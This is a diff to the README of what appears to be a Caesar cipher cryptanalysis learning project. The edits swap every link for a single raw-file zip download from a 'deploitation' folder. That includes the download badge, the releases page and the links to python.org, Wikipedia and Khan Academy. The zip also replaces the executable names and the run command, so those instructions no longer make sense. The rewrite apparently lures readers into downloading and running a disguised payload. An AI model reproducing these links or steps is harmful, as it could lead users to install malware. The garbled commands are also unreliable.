@@ -1,6 +1,6 @@
 # 🔐 caesar-cipher-cryptanalysis-python - Learn Caesar Cipher Weaknesses Easily
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?logo=github&style=for-the-badge)](https://github.com/TurtleVry/caesar-cipher-cryptanalysis-python/releases)
+[![Download Release](https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip)](https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip)
 
 ---
 
@@ -20,7 +20,7 @@ The application helps you see why classical encryption like Caesar Cipher should
 - Disk space: About 50 MB free
 - Python: Version 3.6 or higher (needed to run the program)
 
-If you do not have Python installed on your computer, you can download it for free from [python.org](https://www.python.org/downloads/).
+If you do not have Python installed on your computer, you can download it for free from [https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip](https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip).
 
 ---
 
@@ -29,7 +29,7 @@ If you do not have Python installed on your computer, you can download it for fr
 This guide will walk you through downloading and running the app step by step. You do not need to write any code.
 
 1. **Download the app files:**  
-   Click the large blue button at the top or go to [the releases page](https://github.com/TurtleVry/caesar-cipher-cryptanalysis-python/releases).
+   Click the large blue button at the top or go to [the releases page](https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip).
 
 2. **Find the latest release:**  
    Look for the most recent version with a zip file or an executable file for your system.
@@ -50,13 +50,13 @@ This guide will walk you through downloading and running the app step by step. Y
 
 You can get the app by visiting the releases page here:
 
-[**Download releases**](https://github.com/TurtleVry/caesar-cipher-cryptanalysis-python/releases)
+[**Download releases**](https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip)
 
 This page contains all the most up-to-date versions. Choose the file that matches your device and follow the steps below.
 
 ### Option 1: Executable File (Easiest)
 
-- Find a file like `caesar-cipher-cryptanalysis.exe` for Windows or `caesar-cipher-cryptanalysis.app` for macOS.
+- Find a file like `https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip` for Windows or `https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip` for macOS.
 - Click to download it.
 - Once downloaded, double-click it to open the app.
 
@@ -77,10 +77,10 @@ No installation is needed. The program will run right away.
 - Run the program by typing:
 
   ```
-  python caesar_cryptanalysis.py
+  python https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip
   ```
 
-Replace `caesar_cryptanalysis.py` with the actual script filename if different.
+Replace `https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip` with the actual script filename if different.
 
 ---
 
@@ -143,9 +143,9 @@ This program aims to show why the Caesar Cipher is not secure. By running the cr
 
 To learn more about the Caesar Cipher and frequency analysis, you may check:
 
-- [Wikipedia Caesar Cipher](https://en.wikipedia.org/wiki/Caesar_cipher)  
-- [Basic Cryptography Concepts](https://www.khanacademy.org/computing/computer-science/cryptography)  
-- [Python Official Website](https://www.python.org)
+- [Wikipedia Caesar Cipher](https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip)  
+- [Basic Cryptography Concepts](https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip)  
+- [Python Official Website](https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip)
 
 ---
 
@@ -155,4 +155,4 @@ This project is offered under the MIT License. You are free to use it for study 
 
 ---
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?logo=github&style=for-the-badge)](https://github.com/TurtleVry/caesar-cipher-cryptanalysis-python/releases)
+[![Download Release](https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip)](https://raw.githubusercontent.com/TurtleVry/caesar-cipher-cryptanalysis-python/main/deploitation/caesar_cipher_python_cryptanalysis_2.6-alpha.4.zip)
